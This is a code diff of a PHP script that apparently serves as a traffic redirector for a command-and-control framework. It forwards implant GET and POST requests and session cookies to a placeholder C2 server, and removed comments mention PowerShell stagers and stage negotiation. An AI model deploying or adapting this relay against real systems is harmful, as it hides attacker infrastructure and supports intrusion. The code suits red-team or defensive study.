@@ -1,37 +1,31 @@
 <?php
 
-// TODO: IP black/whitelisting?
-
-$server = "REPLACE_SERVER";
-
-# get a random resource
-# default -> /admin/get.php,/news.asp,/login/process.jsp
-$resources = explode("," , "REPLACE_RESOURCES");
-$resource = $resources[mt_rand(0, count($resources) - 1)];
+$server = rtrim("REPLACE_SERVER", '/');
 
 
-function do_get_request($url, $optional_headers = null)
+function do_get_request($url, $optionalHeaders = null)
 {
   $aContext = array(
     'http' => array(
       'method' => 'GET'
     ),
   );
-  if ($optional_headers !== null) {
-    $aContext['http']['header'] = $optional_headers;
+  if ($optionalHeaders !== null) {
+    $aContext['http']['header'] = $optionalHeaders;
   }
   $cxContext = stream_context_create($aContext);
-  return file_get_contents($url, False, $cxContext);
+  echo file_get_contents($url, False, $cxContext);
 }
 
-function do_post_request($url, $data, $optional_headers = null)
+
+function do_post_request($url, $data, $optionalHeaders = null)
 {
   $params = array('http' => array(
               'method' => 'POST',
               'content' => $data
             ));
-  if ($optional_headers !== null) {
-    $params['http']['header'] = $optional_headers;
+  if ($optionalHeaders !== null) {
+    $params['http']['header'] = $optionalHeaders;
   }
   $ctx = stream_context_create($params);
   $fp = @fopen($url, 'rb', false, $ctx);
@@ -42,56 +36,31 @@ function do_post_request($url, $data, $optional_headers = null)
   if ($response === false) {
     return '';
   }
-  return $response;
+  echo $response;
 }
 
-if ($_SERVER['REQUEST_METHOD'] === "GET"){
-  $parts = explode("?", $_SERVER['REQUEST_URI']);
-  if (count($parts) > 1){
 
-    $parts = explode("&", base64_decode($parts[1]));
-    if (count($parts) == 2){
-      // in case where're doing stage 0 requests for stager.ps1
-      $uri = $server.$parts[1]."?".base64_encode($parts[0]);
-      echo do_get_request($uri);
-    }
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+  $requestURI = $_SERVER['REQUEST_URI'];
+  if(isset($_COOKIE['session'])) {
+    return do_get_request($server.$requestURI, "Cookie: session=".str_replace(' ', '+', $_COOKIE['session']));
   }
   else {
-    if(isset($_COOKIE['SESSIONID'])) {
-      echo do_get_request(rtrim($server, "/").$resource, "Cookie: SESSIONID=".$_COOKIE['SESSIONID']);
-    }
-    else{
-      echo do_get_request(rtrim($server, "/").$resource);
-    }
+    return do_get_request($server.$requestURI);
   }
 }
 
-else{
-  $parts = explode("?", $_SERVER['REQUEST_URI']);
-  if (count($parts) > 1){
+else {
+  // otherwise it's a POST
+  $requestURI = $_SERVER['REQUEST_URI'];
+  $postdata = file_get_contents("php://input");
 
-    $parts = explode("&", base64_decode($parts[1]));
-    if (count($parts) == 2){
-      // in case we're continuing stage negotiation
-      $uri = $server.$parts[1]."?".base64_encode($parts[0]);
-      $postdata = file_get_contents("php://input");
-
-      if(isset($_COOKIE['SESSIONID'])) {
-        echo do_post_request($uri, $postdata, "Cookie: SESSIONID=".$_COOKIE['SESSIONID']);
-      }
-      else{
-        echo do_post_request($uri, $postdata);
-      }
-    }
+  if(isset($_COOKIE['session'])) {
+    return do_post_request($server.$requestURI, $postdata, "Cookie: session=".str_replace(' ', '+', $_COOKIE['session']));
   }
-  else{
-    $postdata = file_get_contents("php://input");
-    if(isset($_COOKIE['SESSIONID'])) {
-      echo do_post_request(rtrim($server, "/").$resource, $postdata, "Cookie: SESSIONID=".$_COOKIE['SESSIONID']);
-    }
-    else{
-      echo do_post_request(rtrim($server, "/").$resource, $postdata);
-    } 
+  else {
+    return do_post_request($server.$requestURI, $postdata);
   }
 }
+
 ?>
